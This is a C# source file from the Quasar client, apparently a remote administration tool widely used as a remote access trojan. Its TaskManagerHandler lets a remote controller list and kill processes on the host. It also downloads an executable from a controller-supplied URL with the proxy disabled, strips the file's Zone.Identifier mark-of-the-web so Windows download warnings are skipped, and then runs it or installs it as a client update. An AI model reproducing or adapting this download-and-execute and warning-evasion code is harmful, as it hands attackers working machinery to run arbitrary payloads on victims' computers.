using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class TaskManagerHandler : MessageProcessorBase<object>
    {
        private readonly QuasarClient _client;

        public TaskManagerHandler(QuasarClient client) : base(false)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is GetProcesses ||
                                                             message is DoProcessStart ||
                                                             message is DoProcessEnd;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle
                };
                processes[i] = process;
            }

            client.Send(new GetProcessesResponse { Processes = processes });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            new Thread(() =>
            {
                string filePath = message.FilePath;

                if (string.IsNullOrEmpty(filePath))
                {
                    if (string.IsNullOrEmpty(message.DownloadUrl))
                    {
                        client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                        return;
                    }

                    filePath = FileHelper.GetTempFilePath(".exe");

                    // download first
                    try
                    {
                        using (WebClient c = new WebClient())
                        {
                            c.Proxy = null;
                            c.DownloadFile(message.DownloadUrl, filePath);
                        }

                        FileHelper.DeleteZoneIdentifier(filePath);
                    }
                    catch
                    {
                        client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                        NativeMethods.DeleteFile(filePath);
                        return;
                    }
                }

                if (message.IsUpdate)
                {
                    try
                    {
                        var clientUpdater = new ClientUpdater();
                        clientUpdater.Update(filePath); 
                        _client.Exit();
                    }
                    catch (Exception ex)
                    {
                        NativeMethods.DeleteFile(filePath);
                        client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                    }
                }
                else
                {
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            UseShellExecute = true,
                            FileName = filePath
                        };
                        Process.Start(startInfo);
                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = true});
                    }
                    catch (Exception)
                    {
                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
                    }

                }
            }).Start();
        }

        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
            }
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
